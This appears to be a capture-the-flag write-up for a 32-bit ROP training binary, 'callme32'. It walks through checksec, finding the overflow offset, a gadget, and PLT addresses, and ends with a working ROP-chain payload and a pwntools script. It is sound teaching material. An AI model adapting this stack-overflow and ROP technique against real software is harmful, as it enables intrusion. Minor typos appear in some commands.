# Basic Test:

## Check call system into binary file
```bash
strace ./callme32
```

## Check protection into binary file
```bash
checksec ./callme32
```

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'

<br>

# Exploitation:

## Clear the kernel ring buffer
```bash
sudo dmesg -C
```

## Find offset for overwrite RIP
```bash
python2 -c 'print "A"*44 + "B"*4*' | ./callme32
```

## See output
```bash
sudo dmesg -T
```

	[dim. avril  9 14:20:16 2023] callme32[119719]: segfault at 42424242 ip 0000000042424242 sp 00000000ffb8f830 error 14 in libc.so.6[f7c00000+22000] likely on CPU 0 (core 0, socket 0)

## Find the a gadget for three parameters

```bash
ROPgadget --binary ./callme32 | grep "pop esi ; pop edi ; pop ebp"
```
 
	0x080487f9 : pop esi ; pop edi ; pop ebp ; ret

## Write the 3 function parameters

	args_1: BIG ENDIAN 0xdeadbeef => LITTLE ENDIAN \xef\xbe\xad\xde
	args_2: BIG ENDIAN 0xcafebabe => LITTLE ENDIAN \xbe\xba\xfe\xca
	args_3: BIG ENDIAN 0xd00df00d => LITTLE ENDIAN \x0d\xf0\x0d\xd0

## Find the address of the 3 functions
```bash
pwngdb> disass*usefulFunction
```

	   0x0804874f <+0>:     push   ebp
	   0x08048750 <+1>:     mov    ebp,esp
	   0x08048752 <+3>:     sub    esp,0x8
	   0x08048755 <+6>:     sub    esp,0x4
	   0x08048758 <+9>:     push   0x6
	   0x0804875a <+11>:    push   0x5
	   0x0804875c <+13>:    push   0x4
	   0x0804875e <+15>:    call   0x80484e0 <callme_three@plt>
	   0x08048763 <+20>:    add    esp,0x10
	   0x08048766 <+23>:    sub    esp,0x4
	   0x08048769 <+26>:    push   0x6
	   0x0804876b <+28>:    push   0x5
	   0x0804876d <+30>:    push   0x4
	   0x0804876f <+32>:    call   0x8048550 <callme_two@plt>
	   0x08048774 <+37>:    add    esp,0x10
	   0x08048777 <+40>:    sub    esp,0x4
	   0x0804877a <+43>:    push   0x6
	   0x0804877c <+45>:    push   0x5
	   0x0804877e <+47>:    push   0x4
	   0x08048780 <+49>:    call   0x80484f0 <callme_one@plt>
	   0x08048785 <+54>:    add    esp,0x10
	   0x08048788 <+57>:    sub    esp,0xc
	   0x0804878b <+60>:    push   0x1
	   0x0804878d <+62>:    call   0x8048510 <exit@plt>

## Payload final CLI

```bash
python2 -c 'print "A"*44 + "\xf0\x84\x04\x08" + "\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0" + "\x50\x85\x04\x08" + "\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0" + "\xe0\x84\x04\x08" + "\xf9\x87\x04\x08" + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0"' | ./callme32 # call callme_one = 0x80484f0 + pop esi ; pop edi ; pop ebp = 0x080487f9 + args1 = 0xdeadbeef + args2 = 0xcafebabe + args3 = 0xd00df00dcall + callme_two = 0x8048550 + pop esi ; pop edi ; pop ebp = 0x080487f9 + args1 = 0xdeadbeef + args2 = 0xcafebabe + args3 = 0xd00df00d + callme_three = 0x80484e0 + pop esi ; pop edi ; pop ebp = 0x080487f9 + args1 = 0xdeadbeef + args2 = 0xcafebabe + args3 = 0xd00df00d
```

## Python2 pwntools script
```python
#usr/bin/python2
from pwn import *

  

padding = "A"*44
pop_esi_pop_edi_pop_ebp = p32(0x080487f9)
args1 = p32(0xdeadbeef)
args2 = p32(0xcafebabe)
args3 = p32(0xd00df00d)
callme_one = p32(0x80484f0)
callme_two = p32(0x8048550)
callme_three = p32(0x80484e0)

  

payload = padding + callme_one + pop_esi_pop_edi_pop_ebp + args1 + args2 + args3
payload += callme_two + pop_esi_pop_edi_pop_ebp + args1 + args2 + args3
payload += callme_three + pop_esi_pop_edi_pop_ebp + args1 + args2 + args3

  

io = process("./callme32")
io.sendline(payload)
io.interactive()
```